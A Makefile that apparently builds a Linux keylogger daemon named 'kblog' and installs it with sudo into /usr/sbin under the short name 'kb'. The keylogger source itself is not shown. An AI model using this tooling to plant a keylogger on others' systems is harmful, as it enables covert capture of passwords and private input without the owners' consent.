event=
name=kblog

.PHONY: all
all: keylogger

keylogger: keylogger.o
	gcc -o keylogger keylogger.o
	chmod 755 keylogger
	mkdir -p bin/
	mv keylogger.o bin/
	mv keylogger bin/

keylogger.o: src/keylogger.c src/keylogger.h
	gcc -DEVENT_NUMBER=\"$(event)\" -DDAEMON_NAME=\"$(name)\" -c src/keylogger.c

.PHONY: install
install:
	cp bin/keylogger kb
	sudo mv kb /usr/sbin/

.PHONY: uninstall
uninstall:
	sudo rm -f /usr/sbin/kb

.PHONY: clean
clean:
	rm -rf bin/